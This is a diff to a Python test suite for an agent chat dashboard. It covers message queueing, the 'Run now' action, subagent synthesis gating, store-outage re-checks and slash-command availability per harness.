+        with patch.object(chat_runner, "settle_consumed_steers", return_value=[]):
+            chat_runner._settle_consumed_steers(slot, "a")
+
+        assert slot._steer_possibly_delivered == set()
+
+    def test_a_steer_requeued_with_its_rpc_in_flight_is_possibly_delivered(self, tmp_path):
+        """The turn ended while the steer's RPC was still writing: its frame may
+        already be in the pipe and the RPC's own verdict lands after the entry
+        may have drained, so the requeue marks it now."""
+        from kiro_crew.dashboard.chat_utils import STEER_POSSIBLY_DELIVERED_META
+
+        state, slot = _state(tmp_path), _slot()
+        slot._pending_steers = ["in flight", "settled"]
+        slot._steer_rpc_in_flight = {"in flight"}
+
+        chat_runner._requeue_unconsumed_steers(state, slot)
+
+        marks = {
+            e["content"]: bool((e.get("meta") or {}).get(STEER_POSSIBLY_DELIVERED_META))
+            for e in slot._queue
+        }
+        assert marks == {"in flight": True, "settled": False}
+
+    def test_a_possibly_delivered_steer_drains_alone(self, tmp_path):
+        """Its note speaks for one message, so a merge never folds the user's
+        later messages under it."""
+        from kiro_crew.dashboard.chat_utils import _dequeue_next_message
+
+        state, slot = _state(tmp_path), _slot()
+        slot.queue_append("later one")
+        slot._pending_steers = ["the steer"]
+        slot._steer_possibly_delivered = {"the steer"}
+        chat_runner._requeue_unconsumed_steers(state, slot)
+        slot.queue_append("later two")
+
+        content, consumed = _dequeue_next_message(slot, merge_enabled=True)
+        assert content == "the steer" and len(consumed) == 1
+        content, consumed = _dequeue_next_message(slot, merge_enabled=True)
+        assert len(consumed) == 2
+
     def test_requeue_is_a_noop_without_pending_steers(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
 
@@ -2585,6 +2637,80 @@ class TestStartNextQueuedTurn:
         assert len(slot._queue) == 1
 
     @pytest.mark.asyncio
+    async def test_run_now_bypasses_the_child_hold_for_the_selected_message(self, tmp_path):
+        """The explicit card action runs one selected user message beside child work."""
+        state, slot = _state(tmp_path), _slot()
+        q1 = slot.queue_append("first")
+        q2 = slot.queue_append("second")
+        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=["agent-1"]))
+
+        with (
+            patch.object(chat_runner.KiroCrewConfig, "load") as load,
+            patch.object(chat_runner, "spawn_guarded_turn", return_value=MagicMock()) as spawn,
+            patch.object(
+                chat_runner, "_run_chat", new=MagicMock(return_value=MagicMock())
+            ) as run_chat,
+        ):
+            load.return_value.dashboard.merge_queued_messages = False
+            started = await chat_runner._start_next_queued_turn(
+                state,
+                slot,
+                allow_user_during_subagents=True,
+                required_queue_id=q2,
+            )
+
+        assert started is True
+        assert spawn.call_count == 1
+        assert run_chat.call_args.args[2] == "second"
+        assert [item["id"] for item in slot._queue] == [q1]
+
+    @pytest.mark.asyncio
+    async def test_run_now_never_merges_unselected_cards(self, tmp_path):
+        """The selected card runs alone even when ordinary queue merging is on."""
+        state, slot = _state(tmp_path), _slot()
+        q1 = slot.queue_append("first")
+        q2 = slot.queue_append("selected")
+        q3 = slot.queue_append("third")
+        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=["agent-1"]))
+
+        with (
+            patch.object(chat_runner.KiroCrewConfig, "load") as load,
+            patch.object(chat_runner, "spawn_guarded_turn", return_value=MagicMock()) as spawn,
+            patch.object(
+                chat_runner, "_run_chat", new=MagicMock(return_value=MagicMock())
+            ) as run_chat,
+        ):
+            load.return_value.dashboard.merge_queued_messages = True
+            started = await chat_runner._start_next_queued_turn(
+                state,
+                slot,
+                allow_user_during_subagents=True,
+                required_queue_id=q2,
+            )
+
+        assert started is True
+        assert spawn.call_count == 1
+        assert run_chat.call_args.args[2] == "selected"
+        assert [item["id"] for item in slot._queue] == [q1, q3]
+
+    @pytest.mark.asyncio
+    async def test_run_now_starts_nothing_when_the_selected_card_is_gone(self, tmp_path):
+        """Selection identity prevents a stale click from starting another card."""
+        state, slot = _state(tmp_path), _slot()
+        qid = slot.queue_append("another card")
+        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=["agent-1"]))
+
+        started = await chat_runner._start_next_queued_turn(
+            state,
+            slot,
+            allow_user_during_subagents=True,
+            required_queue_id="missing",
+        )
+
+        assert started is False
+        assert [item["id"] for item in slot._queue] == [qid]
+
+    @pytest.mark.asyncio
     async def test_reset_notice_is_emitted_for_a_stopping_slot(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
         slot.queue_append("next please")
@@ -2628,40 +2754,195 @@ class TestStartNextQueuedTurn:
         assert slot._deferred_notes == []
 
     @pytest.mark.asyncio
-    async def test_a_held_note_is_withheld_from_a_plans_next_stage(self, tmp_path):
-        """A plain user message queued during a plan must not release the note.
-
-        This is the flush that leaks FIRST. A queued user message carries no
-        ``kind``, so the origin-tag guard admits the flush -- and it runs ABOVE the
-        ``in_stage`` dequeue gate that then holds that message back. So the note
-        was released while no user turn started at all, and the next stage drained
-        its context half. ``_stage_loop``'s exit flush is the seam that owes it
-        delivery, so withholding delays rather than loses it.
-        """
+    @pytest.mark.parametrize(
+        "children, ends_batch",
+        [
+            ({}, True),
+            ({"running": [{"id": "b2", "stalled": True}]}, False),
+            ({"in_memory": True}, False),
+            ({"delivering": 1}, False),
+            ({"unreadable": True}, False),
+            ({"probe_raises": True}, False),
+            ({"queued_in_store": 1}, False),
+            ({"store_unreadable": True}, False),
+        ],
+        ids=[
+            "settled",
+            "running",
+            "pending-in-memory",
+            "delivering",
+            "unreadable",
+            "probe-raises",
+            "queued-in-store",
+            "store-unreadable",
+        ],
+    )
+    async def test_a_user_message_ends_the_batch_only_when_nothing_is_out(
+        self, tmp_path, children, ends_batch
+    ):
+        """A user message drained at a turn's end (`_hand_off_queue`, the
+        ending turn still holding the floor) disarms the synthesis either way.
+        It clears the batch's turn count only when the fire gate answers clear,
+        so no child of the batch is still out: clearing a live batch's count
+        loses its synthesis, while keeping a stale one costs at most one extra
+        synthesis. A store nobody could read keeps it too. The running child is
+        flagged stalled so the drain's own child hold lets the message through;
+        the fire gate still counts it as running."""
         state, slot = _state(tmp_path), _slot()
-        slot._deferred_notes.append({"content": "held", "cls": "reconcile-note"})
-        slot.queue_append("a plain user message")  # carries no `kind`
-        slot._in_stage_execution = True
-        state.subagents = None
+        slot._pending_synthesis = True
+        slot._synthesis_completion_turns = 2
+        slot._subagent_deliveries_inflight = children.get("delivering", 0)
+        subs = _children(
+            running=children.get("running", ()),
+            in_memory=children.get("in_memory", False),
+            # A gate-deferred child the store alone holds. The manager has
+            # published no depth for it (its table stays empty), so only the
+            # fire gate's store read sees it. None is a store nobody could read.
+            queued=(
+                None if children.get("store_unreadable") else children.get("queued_in_store", 0)
+            ),
+        )
+        if children.get("unreadable"):
+            subs.running_agents_for = MagicMock(return_value=None)
+        if children.get("probe_raises"):
+            subs.has_in_memory_pending_work_for = MagicMock(side_effect=RuntimeError("gone"))
+        state.subagents = subs
+        slot.queue_append("a user message")
+        slot.task = ending = asyncio.get_running_loop().create_future()
 
-        assert await chat_runner._start_next_queued_turn(state, slot) is False
-
-        assert len(slot._queue) == 1, "fixture: the user message must be held back"
-        assert len(slot._deferred_notes) == 1, "the note was released into the next stage"
-        assert "held" not in [m["content"] for m in slot.messages]
-
-        # Control: the same fixture with the plan gate CLEAR does flush, so the
-        # assertion above measures the stage guard rather than the dequeue hold.
-        state2, slot2 = _state(tmp_path), _slot()
-        slot2._deferred_notes.append({"content": "held", "cls": "reconcile-note"})
-        slot2.queue_append("a plain user message")
-        state2.subagents = None
         with (
-            patch.object(chat_runner, "spawn_guarded_turn", return_value=MagicMock()),
-            patch.object(chat_runner, "_run_chat", return_value=MagicMock()),
+            patch.object(chat_runner, "spawn_guarded_turn", return_value=MagicMock()) as spawn,
+            patch.object(chat_runner, "_run_chat", new=MagicMock(return_value=MagicMock())),
         ):
-            assert await chat_runner._start_next_queued_turn(state2, slot2) is True
-        assert slot2._deferred_notes == [], "control: the note should flush off-plan"
+            try:
+                await chat_runner._hand_off_queue(
+                    state, slot, drain=True, allow_automatic_successor=True
+                )
+            finally:
+                ending.cancel()
+
+        assert spawn.call_count == 1, "the message drained as the next turn"
+        assert slot._pending_synthesis is False, "the user takes over, as before"
+        assert slot._synthesis_completion_turns == (0 if ends_batch else 2)
+
+    @pytest.mark.asyncio
+    async def test_an_armed_drain_reads_no_store_and_keeps_the_count(self, tmp_path):
+        """The drain itself (Run now, Continue, rewind, regenerate, the parked
+        drain) is origin/main's await-free dequeue: it reads no store, so it
+        cannot judge the batch, and it keeps the count. Only its callers that
+        read the fire gate with the floor held say `end_batch`."""
+        state, slot = _state(tmp_path), _slot()
+        slot._pending_synthesis = True
+        slot._synthesis_completion_turns = 2
+        state.subagents = _children()
+        slot.queue_append("a user message")
+        seen: list = []
+
+        async def _verdict(_state, _slot):
+            seen.append(True)
+            return chat_runner.SYNTHESIS_CLEAR
+
+        with (
+            patch.object(chat_runner, "synthesis_fire_verdict", new=_verdict),
+            patch.object(chat_runner, "spawn_guarded_turn", return_value=MagicMock()) as spawn,
+            patch.object(chat_runner, "_run_chat", new=MagicMock(return_value=MagicMock())),
+        ):
+            started = await chat_runner._start_next_queued_turn(state, slot)
+
+        assert started is True
+        assert spawn.call_count == 1
+        assert seen == [], "no fire-gate read in the drain"
+        state.subagents.queued_count_or_none_async.assert_not_awaited()
+        state.subagents.has_in_memory_pending_work_for.assert_not_called()
+        assert slot._pending_synthesis is False, "the user takes over, as before"
+        assert slot._synthesis_completion_turns == 2, "a drain that read nothing keeps the count"
+
+    @pytest.mark.asyncio
+    async def test_the_hand_off_reads_while_the_ending_turn_holds_the_floor(self, tmp_path):
+        """The turn-end hand-off takes the one fire-gate read, and it takes it
+        while `slot.task` is still the ending turn and the message is still
+        queued: a completion that lands then queues behind the turn instead of
+        taking the floor, so the drain that follows cannot dispatch beside one.
+        The verdict reaches the drain as `end_batch`."""
+        state, slot = _state(tmp_path), _slot()
+        slot._pending_synthesis = True
+        slot._synthesis_completion_turns = 2
+        state.subagents = _children()
+        qid = slot.queue_append("a user message")
+        slot.task = ending = asyncio.get_running_loop().create_future()
+        seen: list = []
+
+        async def _verdict(_state, _slot):
+            seen.append(([item["id"] for item in _slot._queue], _slot.task))
+            await asyncio.sleep(0)  # a real suspension, as the store read is
+            return chat_runner.SYNTHESIS_CLEAR
+
+        with (
+            patch.object(chat_runner, "synthesis_fire_verdict", new=_verdict),
+            patch.object(chat_runner, "spawn_guarded_turn", return_value=MagicMock()) as spawn,
+            patch.object(chat_runner, "_run_chat", new=MagicMock(return_value=MagicMock())),
+        ):
+            try:
+                await chat_runner._hand_off_queue(
+                    state, slot, drain=True, allow_automatic_successor=True
+                )
+            finally:
+                ending.cancel()
+
+        assert seen == [([qid], ending)], "one read, message still queued, floor still held"
+        assert spawn.call_count == 1
+        assert slot._pending_synthesis is False
+        assert slot._synthesis_completion_turns == 0
+
+    @pytest.mark.asyncio
+    async def test_an_unarmed_hand_off_reads_no_store(self, tmp_path):
+        """Only an armed synthesis's disarm needs the verdict, so an ordinary
+        turn end costs no store read."""
+        state, slot = _state(tmp_path), _slot()
+        state.subagents = _children()
+        slot.queue_append("a user message")
+        slot.task = ending = asyncio.get_running_loop().create_future()
+
+        with (
+            patch.object(chat_runner, "spawn_guarded_turn", return_value=MagicMock()) as spawn,
+            patch.object(chat_runner, "_run_chat", new=MagicMock(return_value=MagicMock())),
+        ):
+            try:
+                await chat_runner._hand_off_queue(
+                    state, slot, drain=True, allow_automatic_successor=True
+                )
+            finally:
+                ending.cancel()
+
+        assert spawn.call_count == 1
+        state.subagents.queued_count_or_none_async.assert_not_awaited()
+        state.subagents.has_in_memory_pending_work_for.assert_not_called()
+
+
+def _no_children() -> MagicMock:
+    """A registry with no child attached: none running and none queued.
+
+    The synthesis checks ask the teardown guards' predicate, which also counts
+    children the spawn gate still holds; a bare MagicMock would answer that
+    count with a truthy mock and read as a queued child.
+    """
+    return _children()
+
+
+def _children(*, running=(), queued: int | None = 0, in_memory: bool = False) -> MagicMock:
+    """A registry double for the synthesis fire gate with every probe set
+    explicitly: a bare MagicMock answers an unset probe with a truthy mock
+    (``int(MagicMock()) == 1``), which reads as a queued child. *queued*
+    ``None`` is a store nobody could read. The manager's published depth
+    table, which the slots push reads, stays empty: no synthesis check reads
+    it, so a queued child is *queued* alone."""
+    return MagicMock(
+        running_agents_for=MagicMock(return_value=list(running)),
+        queued_count_for_async=AsyncMock(return_value=queued or 0),
+        queued_count_or_none_async=AsyncMock(return_value=queued),
+        has_in_memory_pending_work_for=MagicMock(return_value=in_memory),
+        published_queued_depths=MagicMock(return_value={}),
+    )
 
 
 class TestRunPendingSynthesis:
@@ -2692,23 +2973,86 @@ class TestRunPendingSynthesis:
         assert slot._pending_synthesis is True
 
     @pytest.mark.asyncio
-    async def test_running_agents_defer_synthesis(self, tmp_path):
+    async def test_the_dispatch_does_not_read_the_store_again(self, tmp_path):
+        """The fire gate's verdict is taken once, by the caller: the synthesis
+        dispatch itself asks no registry probe."""
         state, slot = _state(tmp_path), _slot()
         slot._pending_synthesis = True
-        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=["a"]))
+        state.subagents = _children()
 
-        with patch.object(chat_runner, "_finish_queue_cycle") as finish:
+        async def _ok():
+            return None
+
+        def _capture(_state, _slot, coro, *a, **kw):
+            coro.close()
+            return asyncio.ensure_future(_ok())
+
+        with (
+            patch.object(chat_runner, "spawn_guarded_turn", side_effect=_capture),
+            patch.object(chat_runner, "_run_chat", return_value=MagicMock()),
+        ):
             await chat_runner._run_pending_synthesis(state, slot)
 
-        finish.assert_called_once()
-        assert slot._pending_synthesis is True
+        state.subagents.queued_count_or_none_async.assert_not_awaited()
+        state.subagents.running_agents_for.assert_not_called()
+        assert slot._pending_synthesis is False
+
+    @pytest.mark.asyncio
+    async def test_running_the_synthesis_ends_its_batch(self, tmp_path):
+        """The consumed arm takes the batch's turn count with it, so the next
+        lone completion is a batch of its own."""
+        state, slot = _state(tmp_path), _slot()
+        slot._pending_synthesis = True
+        slot._synthesis_completion_turns = 2
+        state.subagents = _children()
+
+        async def _ok():
+            return None
+
+        def _capture(_state, _slot, coro, *a, **kw):
+            coro.close()
+            return asyncio.ensure_future(_ok())
+
+        with (
+            patch.object(chat_runner, "spawn_guarded_turn", side_effect=_capture),
+            patch.object(chat_runner, "_run_chat", new=MagicMock(return_value=MagicMock())),
+        ):
+            await chat_runner._run_pending_synthesis(state, slot)
+
+        assert slot._synthesis_completion_turns == 0
+
+    @pytest.mark.asyncio
+    async def test_a_queued_user_message_ends_the_batch_without_a_read(self, tmp_path):
+        """The caller launched this task on a clear verdict, so a user message
+        it drains instead of the synthesis ends the batch (count zeroed) with
+        no second fire-gate read: the drain runs with `end_batch`."""
+        state, slot = _state(tmp_path), _slot()
+        slot._pending_synthesis = True
+        slot._synthesis_inflight = True
+        slot._synthesis_completion_turns = 2
+        state.subagents = _children()
+        slot.queue_append("a user message")
+
+        with (
+            patch.object(chat_runner, "spawn_guarded_turn", return_value=MagicMock()) as spawn,
+            patch.object(chat_runner, "_run_chat", new=MagicMock(return_value=MagicMock())),
+        ):
+            await chat_runner._run_pending_synthesis(state, slot)
+
+        assert spawn.call_count == 1, "the user message ran, not the synthesis"
+        assert [m["role"] for m in slot.messages if m["role"] == "inject"] == []
+        state.subagents.queued_count_or_none_async.assert_not_awaited()
+        state.subagents.has_in_memory_pending_work_for.assert_not_called()
+        assert slot._pending_synthesis is False
+        assert slot._synthesis_completion_turns == 0
+        assert slot._synthesis_inflight is False
 
     @pytest.mark.asyncio
     async def test_synthesis_timeout_is_swallowed(self, tmp_path):
         """The ceiling already rendered a card; re-raising would go unretrieved."""
         state, slot = _state(tmp_path), _slot()
         slot._pending_synthesis = True
-        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=[]))
+        state.subagents = _no_children()
 
         async def _boom():
             raise asyncio.TimeoutError
@@ -2736,7 +3080,7 @@ class TestRunPendingSynthesis:
         """
         state, slot = _state(tmp_path), _slot()
         slot._pending_synthesis = True
-        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=[]))
+        state.subagents = _no_children()
 
         async def _ok():
             return None
@@ -2816,7 +3160,7 @@ class TestFinishQueueCycle:
         state, slot = _state(tmp_path), _slot()
         state._slots[slot.key] = slot  # a live slot is registered
         slot._pending_synthesis = True
-        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=[]))
+        state.subagents = _no_children()
 
         with patch.object(chat_runner, "_run_pending_synthesis", new=AsyncMock()):
             await chat_runner._finish_queue_cycle(state, slot)
@@ -2826,6 +3170,225 @@ class TestFinishQueueCycle:
         assert not any(m.get("role") == "done" for m in slot.messages)
         if slot.task is not None:
             slot.task.cancel()
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "children",
+        [
+            # The running half is what is pinned: the queued probe answers 0.
+            {"running": ["a"], "queued": 0},
+            # A child only the store holds (gate-deferred, or claimed and not
+            # registered).
+            {"queued": 1},
+            # A sibling whose report still waits on its teardown, a window
+            # entry, a live follow-up watcher.
+            {"in_memory": True},
+        ],
+        ids=["running", "queued-in-store", "pending-in-memory"],
+    )
+    async def test_an_attached_child_keeps_the_cycle_idle(self, tmp_path, children):
+        """The fire gate holds for any of its four terms: the cycle goes idle
+        with the arm kept, and no synthesis task starts."""
+        state, slot = _state(tmp_path), _slot()
+        state._slots[slot.key] = slot  # a live slot is registered
+        slot._pending_synthesis = True
+        state.subagents = _children(**children)
+
+        with patch.object(chat_runner, "_run_pending_synthesis", new=AsyncMock()) as synth:
+            await chat_runner._finish_queue_cycle(state, slot)
+            await asyncio.sleep(0)
+
+        synth.assert_not_called()
+        assert slot._synthesis_inflight is False
+        assert slot._pending_synthesis is True
+        assert slot._synthesis_recheck is None, "a real answer arms no re-check"
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("slot_key", ["slack_1712.000100", "cron-nightly"])
+    async def test_a_linked_tab_is_checked_on_its_own_session_key(self, tmp_path, slot_key):
+        """A channel- or cron-born tab's children register under its real
+        session, not ``dashboard:<slot>``: a gate-deferred child there keeps the
+        synthesis from firing."""
+        state, slot = _state(tmp_path), _slot(slot_key)
+        linked = "slack:1712.000100" if slot_key.startswith("slack_") else "cron:nightly"
+        slot.linked_session_key = linked
+        state._slots[slot.key] = slot
+        slot._pending_synthesis = True
+        subs = _children()
+        subs.queued_count_or_none_async = AsyncMock(
+            side_effect=lambda key: 1 if key == linked else 0
+        )
+        state.subagents = subs
+
+        with patch.object(chat_runner, "_run_pending_synthesis", new=AsyncMock()) as synth:
+            await chat_runner._finish_queue_cycle(state, slot)
+            await asyncio.sleep(0)
+
+        synth.assert_not_called()
+        subs.running_agents_for.assert_called_once_with(linked)
+        subs.queued_count_or_none_async.assert_awaited_once_with(linked)
+
+    @pytest.mark.asyncio
+    @pytest.mark.usefixtures("close_subagent_managers")
+    async def test_a_slow_teardown_sibling_holds_the_fire_gate(self, tmp_path):
+        """A: done and reported. B: done, its report still waiting on a teardown
+        longer than the reset timeout. Nothing is running or queued, but B's
+        result has not landed: the real manager's in-memory term holds the
+        fire gate until B's task ends."""
+        from kiro_crew.subagent import SubagentInfo, SubagentManager
+
+        state, slot = _state(tmp_path), _slot()
+        state._slots[slot.key] = slot
+        slot._pending_synthesis = True
+        mgr = SubagentManager(sessions=MagicMock(), ctx_builder=MagicMock())
+        parent = f"dashboard:{slot.key}"
+        b = SubagentInfo(id="b1", task="b", parent_session_key=parent)
+        b.done = True
+        mgr._agents[b.id] = b
+        teardown = asyncio.get_running_loop().create_future()  # never resolves here
+        mgr._tasks[b.id] = teardown
+        mgr.queued_count_or_none_async = AsyncMock(return_value=0)
+        state.subagents = mgr
+        try:
+            with patch.object(chat_runner, "_run_pending_synthesis", new=AsyncMock()) as synth:
+                await chat_runner._finish_queue_cycle(state, slot)
+                await asyncio.sleep(0)
+            synth.assert_not_called()
+            assert slot._pending_synthesis is True
+        finally:
+            teardown.cancel()
+
+    @pytest.mark.asyncio
+    async def test_a_message_sent_during_the_fire_check_runs_next(self, tmp_path):
+        """The user sends while the fire gate reads the store: the turn still
+        looks busy, so the message queues behind it. With a child still queued
+        the synthesis does not fire, and the cycle drains that message the way a
+        normal turn end does instead of leaving it waiting for another turn."""
+        state, slot = _state(tmp_path), _slot()
+        state._slots[slot.key] = slot
+        slot._pending_synthesis = True
+        subs = _children()
+
+        async def _queued_during_probe(_key):
+            await asyncio.sleep(0)
+            slot.queue_append("user msg sent during the probe")
+            return 1  # one gate-held child: attached
+
+        subs.queued_count_or_none_async = AsyncMock(side_effect=_queued_during_probe)
+        state.subagents = subs
+
+        with patch.object(
+            chat_runner, "_start_next_queued_turn", new=AsyncMock(return_value=True)
+        ) as start:
+            await chat_runner._finish_queue_cycle(state, slot)
+
+        start.assert_awaited_once()
+        assert not any(m.get("role") == "done" for m in slot.messages)
+
+    @pytest.mark.asyncio
+    async def test_an_unreadable_store_re_checks_and_fires_on_its_own(self, tmp_path):
+        """No completion is left to re-trigger the check after a store outage at
+        the last turn end, so the idle slot re-asks on a timer and fires once
+        the store answers -- without waiting for a user turn."""
+        state, slot = _state(tmp_path), _slot()
+        state._slots[slot.key] = slot
+        slot._pending_synthesis = True
+        subs = _children()
+        answers = iter([None, 0])
+        subs.queued_count_or_none_async = AsyncMock(side_effect=lambda _k: next(answers))
+        state.subagents = subs
+
+        with (
+            patch.object(chat_runner, "_SYNTHESIS_RECHECK_SECS", 0.01),
+            patch.object(chat_runner, "_run_pending_synthesis", new=AsyncMock()) as synth,
+        ):
+            await chat_runner._finish_queue_cycle(state, slot)
+            assert slot._synthesis_recheck is not None, "an outage arms the re-check"
+            synth.assert_not_called()
+            for _ in range(100):
+                if synth.await_count:
+                    break
+                await asyncio.sleep(0.01)
+
+        synth.assert_awaited_once()
+        assert slot._synthesis_inflight is True
+        if slot.task is not None:
+            slot.task.cancel()
+
+    @pytest.mark.asyncio
+    async def test_a_batch_reported_in_one_turn_drops_the_synthesis(self, tmp_path):
+        """One completion turn already carried every result: the cycle ends as
+        an ordinary one and the arm is consumed on the turn-end path."""
+        state, slot = _state(tmp_path), _slot()
+        state._slots[slot.key] = slot
+        slot._pending_synthesis = True
+        slot._synthesis_completion_turns = 1
+        state.subagents = _children()
+
+        with patch.object(chat_runner, "_run_pending_synthesis", new=AsyncMock()) as synth:
+            await chat_runner._finish_queue_cycle(state, slot)
+
+        synth.assert_not_called()
+        assert slot._pending_synthesis is False
+        assert slot._synthesis_completion_turns == 0
+        assert slot._synthesis_recheck is None
+        assert slot.messages[-1]["role"] == "done"
+
+    @pytest.mark.asyncio
+    async def test_the_outage_re_check_launches_the_synthesis_whatever_the_count(self, tmp_path):
+        """The re-check runs only after the turn-end gate could not read the
+        store, so it keeps main's shape: a clear answer launches the synthesis
+        even for a batch one turn reported. The turn's chat_done already went
+        out with the arm set, and the synthesis turn ends with its own."""
+        state, slot = _state(tmp_path), _slot()
+        state._slots[slot.key] = slot
+        slot._pending_synthesis = True
+        slot._synthesis_completion_turns = 1
+        subs = _children()
+        answers = iter([None, 0])
+        subs.queued_count_or_none_async = AsyncMock(side_effect=lambda _k: next(answers))
+        state.subagents = subs
+
+        def _chat_dones() -> list:
+            return [
+                c.args[1]["continuing"]
+                for c in state.broadcast_ws.call_args_list
+                if c.args and c.args[0] == "chat_done"
+            ]
+
+        with (
+            patch.object(chat_runner, "_SYNTHESIS_RECHECK_SECS", 0.01),
+            patch.object(chat_runner, "_run_pending_synthesis", new=AsyncMock()) as synth,
+        ):
+            await chat_runner._finish_queue_cycle(state, slot)
+            assert _chat_dones() == [True], "the arm was still set at the turn's end"
+            assert slot._synthesis_recheck is not None, "an outage arms the re-check"
+            synth.assert_not_called()
+            for _ in range(100):
+                if synth.await_count:
+                    break
+                await asyncio.sleep(0.01)
+
+        synth.assert_awaited_once()
+        assert slot._pending_synthesis is True, "consumed by the synthesis task, not here"
+        assert slot._synthesis_completion_turns == 1
+        assert _chat_dones() == [True], "no second chat_done: the synthesis turn ends its own"
+        if slot.task is not None:
+            slot.task.cancel()
+
+    @pytest.mark.asyncio
+    async def test_closing_the_slot_cancels_a_pending_re_check(self, tmp_path):
+        state, slot = _state(tmp_path), _slot()
+        state._slots[slot.key] = slot
+        slot._pending_synthesis = True
+        state.subagents = _children(queued=None)
+
+        with patch.object(chat_runner, "_SYNTHESIS_RECHECK_SECS", 60.0):
+            await chat_runner._finish_queue_cycle(state, slot)
+        handle = slot._synthesis_recheck
+        assert handle is not None
+        slot.begin_close()
+        assert handle.cancelled() and slot._synthesis_recheck is None
 
     @pytest.mark.asyncio
     async def test_a_held_note_is_withheld_from_an_automatic_synthesis_turn(self, tmp_path):
@@ -2838,7 +3401,7 @@ class TestFinishQueueCycle:
         state, slot = _state(tmp_path), _slot()
         state._slots[slot.key] = slot  # a live slot is registered
         slot._pending_synthesis = True
-        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=[]))
+        state.subagents = _no_children()
 
         with (
             patch.object(type(slot), "flush_deferred_notes", return_value=0) as flush,
@@ -2853,41 +3416,6 @@ class TestFinishQueueCycle:
             slot.task.cancel()
 
     @pytest.mark.asyncio
-    async def test_a_held_note_is_withheld_from_a_plans_next_stage(self, tmp_path):
-        """This function runs per stage, so a flush here feeds stage N+1.
-
-        Each stage of a plan is its own ``_run_chat``, and this is called from that
-        turn's ``finally`` while ``_in_stage_execution`` is still set -- so the note
-        reached the next stage instead of the next USER turn. Distinct from the
-        synthesis case above: here ``will_synthesize`` is False, which is exactly
-        why the old guard admitted the flush.
-        """
-        state, slot = _state(tmp_path), _slot()
-        state._slots[slot.key] = slot
-        slot._in_stage_execution = True
-        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=[]))
-
-        with patch.object(type(slot), "flush_deferred_notes", return_value=0) as flush:
-            await chat_runner._finish_queue_cycle(state, slot)
-            await asyncio.sleep(0)
-        flush.assert_not_called()
-        if slot.task is not None:
-            slot.task.cancel()
-
-        # Control: identical state with the plan gate clear DOES flush, so the
-        # assertion above cannot pass for some reason unrelated to the stage.
-        state2, slot2 = _state(tmp_path), _slot()
-        state2._slots[slot2.key] = slot2
-        state2.subagents = MagicMock(running_agents_for=MagicMock(return_value=[]))
-
-        with patch.object(type(slot2), "flush_deferred_notes", return_value=0) as flush2:
-            await chat_runner._finish_queue_cycle(state2, slot2)
-            await asyncio.sleep(0)
-        flush2.assert_called_once()
-        if slot2.task is not None:
-            slot2.task.cancel()
-
-    @pytest.mark.asyncio
     async def test_a_closing_slot_does_not_lose_its_held_note_to_synthesis(self, tmp_path):
         """A slot already removed from the registry has no next USER turn.
 
@@ -2896,7 +3424,7 @@ class TestFinishQueueCycle:
         torn down, so withholding there discards the note the POST acknowledged.
         """
         state, slot = _state(tmp_path), _slot()
-        state.subagents = MagicMock(running_agents_for=MagicMock(return_value=[]))
+        state.subagents = _no_children()
         slot._pending_synthesis = True
         slot._deferred_notes.append({"content": "held across the close", "cls": "reconcile-note"})
         # The teardown already dropped it from the registry.
@@ -2932,6 +3460,7 @@ class TestFinishQueueCycle:
     @pytest.mark.asyncio
     async def test_idle_cycle_emits_done_and_refreshes_the_sidebar(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
+        slot._cycle_reached_provider = True  # a provider served this cycle
 
         with patch.object(chat_runner, "title_then_refresh", new=AsyncMock()):
             await chat_runner._finish_queue_cycle(state, slot)
@@ -2943,6 +3472,7 @@ class TestFinishQueueCycle:
         state.broadcast_ws.assert_any_call(
             "chat_done", {"slot": slot.key, "continuing": False, "needs_input": False}
         )
+        assert slot._cycle_reached_provider is False, "the next cycle starts unserved"
 
 
 class TestTtftMetric:
@@ -3289,6 +3819,70 @@ class TestRunChatLocalCommands:
         assert slot.messages[-1]["role"] == "done"
 
     @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "provider,acp_backend,refused",
+        [
+            ("acp", "", True),
+            ("acp", "kas", True),
+            ("claude_code", "", False),
+            ("acp", "claude", False),
+        ],
+    )
+    async def test_todos_is_refused_only_where_the_harness_lacks_it(
+        self, tmp_path, provider, acp_backend, refused
+    ):
+        """/todos is kiro-only: the claude harness answers on either provider axis."""
+        state, client = _runner_state(tmp_path)
+        _set_stream(client, [_complete()])
+        slot = _slot()
+        cfg = await asyncio.to_thread(chat_runner.KiroCrewConfig.load)
+        cfg.agent.provider = provider
+        cfg.agent.acp_backend = acp_backend
+
+        with patch.object(chat_runner.KiroCrewConfig, "load", return_value=cfg):
+            await _drive(state, slot, "/todos")
+
+        notices = [
+            m for m in slot.messages if "not available in the dashboard" in m.get("content", "")
+        ]
+        assert bool(notices) is refused
+        if refused:
+            state.sessions.get_or_create.assert_not_awaited()
+        else:
+            state.sessions.get_or_create.assert_awaited()
+
+    def test_kiro_only_members_are_still_forwarded_once_unblocked(self):
+        """The gate drops these for the claude harness; forwarding must then happen.
+
+        ``is_harness_slash_command`` reads the provider axis alone, so it only
+        agrees with the widened gate while every kiro-only member is in
+        ``_SLASH_COMMANDS`` and forwards on any provider.
+        """
+        from kiro_crew.dashboard.chat_utils import (
+            _KIRO_ONLY_BLOCKED_SLASH_COMMANDS,
+            _SLASH_COMMANDS,
+            is_harness_slash_command,
+        )
+
+        assert _KIRO_ONLY_BLOCKED_SLASH_COMMANDS
+        assert _KIRO_ONLY_BLOCKED_SLASH_COMMANDS <= _SLASH_COMMANDS
+        for cmd in _KIRO_ONLY_BLOCKED_SLASH_COMMANDS:
+            assert is_harness_slash_command(cmd, cc_provider=False) is True, cmd
+
+    @pytest.mark.asyncio
+    async def test_terminal_only_commands_stay_blocked_on_the_claude_harness(self, tmp_path):
+        state, client = _runner_state(tmp_path)
+        slot = _slot()
+        cfg = await asyncio.to_thread(chat_runner.KiroCrewConfig.load)
+        cfg.agent.acp_backend = "claude"
+
